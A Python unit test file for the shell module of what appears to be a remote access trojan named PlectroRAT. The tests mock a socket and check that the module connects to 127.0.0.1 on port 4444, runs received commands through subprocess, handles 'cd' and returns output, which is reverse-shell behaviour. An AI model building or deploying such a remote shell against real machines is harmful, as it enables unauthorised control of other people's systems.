


# Unit tests for shell.py in PlectroRAT

import unittest
from unittest.mock import patch, MagicMock
import socket
import src.shell as shell

class TestShellModule(unittest.TestCase):

    @patch("socket.socket")
    def test_connect_and_listen_runs_command(self, mock_socket_class):
        mock_socket = MagicMock()
        mock_socket.recv.side_effect = [b'echo test\n', b'exit']
        mock_socket_class.return_value = mock_socket

        with patch("subprocess.check_output") as mock_check_output:
            mock_check_output.return_value = b'test\n'
            shell.connect_and_listen("127.0.0.1", 4444)

            mock_socket.connect.assert_called_with(("127.0.0.1", 4444))
            mock_socket.send.assert_called_with(b'test\n')

    @patch("socket.socket")
    def test_cd_command(self, mock_socket_class):
        mock_socket = MagicMock()
        mock_socket.recv.side_effect = [b'cd /', b'exit']
        mock_socket_class.return_value = mock_socket

        with patch("os.chdir") as mock_chdir:
            shell.connect_and_listen("127.0.0.1", 4444)
            mock_chdir.assert_called_with("/")
            self.assertTrue(mock_socket.send.call_args[0][0].startswith(b'[+] Changed'))

if __name__ == "__main__":
    unittest.main()